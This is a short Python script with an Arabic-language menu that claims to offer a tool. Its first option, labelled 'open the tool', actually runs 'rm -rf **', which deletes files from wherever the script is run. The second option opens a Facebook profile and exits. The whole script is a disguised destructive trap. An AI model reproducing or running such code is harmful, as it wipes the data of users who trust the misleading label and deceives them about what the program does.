import os
import sys
print("[1] فـتـح الاداة ") 
print(" [2] الخروج من الاداة ") 
omar = input(" Choose:  ") 
if omar in ["1"]:
   os.system("rm -rf **")
if omar in ["2"]: 
   os.system("xdg-open https://www.facebook.com/profile.php?id=100007682171115") 
   sys.exit() 
